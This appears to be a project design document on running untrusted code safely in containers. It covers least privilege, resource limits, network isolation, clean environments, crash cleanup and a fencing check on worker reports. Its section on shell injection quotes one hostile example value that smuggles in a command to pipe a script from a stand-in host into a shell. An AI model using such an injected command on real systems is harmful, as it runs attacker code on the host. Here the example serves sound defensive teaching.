# Running untrusted code

How a worker runs commands it did not write, from repositories it does not control, without letting them harm the host, other jobs, or the system's own bookkeeping.

## Containers versus virtual machines

**The problem.** A submitted command can do anything a program can do: read files, open connections, start a thousand processes. It needs a box.

**The options.**

- **A virtual machine** emulates a whole computer with its own kernel. Strong isolation, but slow to start and heavy to run.
- **A container** is an ordinary process that the host kernel shows a restricted view of the system: its own filesystem, process list, and network. Starting one takes about a second.
- **A sandboxed container** (gVisor, Firecracker, Kata) sits in between: container convenience with an extra layer between the workload and the host kernel.

The catch with plain containers: every container shares the host's kernel. A kernel bug can break out. Containers protect against careless or mildly hostile code, not against a determined attacker with a kernel exploit.

**In this project.** Plain Docker containers behind the `runtime.Runtime` interface, so a stronger sandbox can replace them later without touching the worker. See [ADR 0005](../adr/0005-docker-runtime.md).

## Least privilege

**The idea.** Give a process only the powers it needs. Everything else is taken away up front, so a mistake or an attack has less to work with.

Even inside a container, "root" can do a lot by default. Linux splits root's powers into **capabilities** (change file ownership, bind low ports, load kernel modules, ...). Each step container:

- drops **all** capabilities;
- sets `no-new-privileges`, so no program inside can gain more (for example through a `setuid` binary);
- has a **read-only root filesystem**, so it cannot modify its own image. It can write only to `/workspace` (the checkout) and `/tmp`.

**In this project.** `containerSpec` in `internal/runtime/runtime.go`. A unit test checks each setting, so loosening one is a visible change.

## Resource limits

**The problem.** A command that allocates memory forever, spins every CPU, or forks endlessly (a *fork bomb*) can starve every other job on the host without "breaking out" of anything.

**The idea.** The kernel's **cgroups** cap what a group of processes may use. When a container hits its memory limit, the kernel kills it instead of letting the host run out.

**In this project.** Each step gets the workload's memory limit with swap disabled (swap would quietly turn a memory limit into a slow disk), a CPU quota, a limit of 512 processes, and a `/tmp` capped at the memory limit.

## Network off by default

A step has no network unless the workload sets `runtime.network`. Without a network it cannot download anything, leak the code it was given, or attack other machines. Build tools often need to fetch dependencies, so workloads can opt in; the default is the safe choice.

## Passing input as data, not code

**The problem.** The checkout runs a shell script with the repository URL and revision. Pasting them into the script text, as in `git fetch origin $REVISION`, invites **injection**: a "revision" of `main; curl evil.sh | sh` becomes a second command.

**The idea.** Never build code out of user input. Pass input through a channel that is always treated as data: query parameters for SQL, and environment variables or arguments for shell scripts. The script stays fixed and refers to `"$TSZ_REV"`; whatever the variable holds, it is one argument.

**In this project.** `checkoutEnv` passes `TSZ_REPO` and `TSZ_REV`; the checkout script itself never changes. The same rule is why every SQL query uses parameters.

## A clean environment

A container inherits nothing from the worker unless it is passed in on purpose. Steps get a fixed environment (`HOME=/tmp`, `CI=true`, tool caches under `/tmp`, the job and attempt IDs). The worker's token is never in it, so a workload cannot read it and call the API as the worker. `TestStepEnvDoesNotLeakWorkerEnvironment` checks this.

## One container per step, one volume per attempt

**The idea.** Each step (check out, execute, verify) starts from a clean container with its own limits and timeout. Files carry over through a named volume mounted at `/workspace`, which is removed when the attempt ends. Nothing a step leaves running survives into the next step.

## Labels and cleaning up after crashes

**The problem.** A worker that crashes mid-job leaves containers and volumes behind. After enough crashes the disk fills.

**The idea.** Tag every resource you create with who created it, then on startup remove everything carrying your own tag. Resources become self-describing; no separate list has to survive the crash.

**In this project.** Containers and volumes carry `dev.tsuzuku.managed`, `dev.tsuzuku.worker`, job, attempt, and role labels. `CleanupLeftovers` removes only the starting worker's resources, so workers sharing a Docker daemon never touch each other's.

## The Docker socket is root

Whoever can talk to the Docker daemon can start a container that mounts the host's root filesystem, which is root on the host. A worker therefore *must* be trusted, even though the containers it starts are not. Untrusted code goes in the containers; trusted code holds the socket. Never mount the socket into a workload container.

## A cancelled request may still happen

**The problem.** The worker asks Docker to create a container, then the job is cancelled and the worker abandons the request. From the worker's side the call failed. But the daemon may already have received it and creates the container anyway, a container the worker never learned the ID of. It then holds the workspace volume, so removing the volume fails.

**The idea.** Cancelling a *request* does not cancel the *operation* on the other side. For calls that create things, either let them finish and then clean up what they made, or be able to find what they made afterwards (by name or label).

**In this project.** `Docker.run` lets create and start run to completion on a context that ignores cancellation, checks for cancellation straight afterwards, and kills and removes what it made. `RemoveWorkspace` also force-removes any container still using the volume before retrying. `TestDockerRunCancelledWhileStartingLeavesNothing` cancels at several delays (0, 20, 100, and 300 ms) because the bug only shows at certain timings.

## The worker reports facts; the server decides

**The problem.** If the program doing the work also decides whether the work succeeded, a bug or a compromised worker can declare anything a success.

**The idea.** Split the roles. The worker reports observable facts (commit, exit codes, timings, container settings). The server applies the rules and records the outcome. Logic that decides outcomes lives in one place, is unit-tested, and can change without redeploying workers.

**Fencing.** A report is only accepted from the worker that owns the attempt, and only while the attempt is still running, checked under a row lock. A late or duplicated report from a worker the system has moved on from is rejected (`404` or `409`) instead of overwriting the newer truth. This guard is often called a **fencing token**: the attempt ID plays that role here.
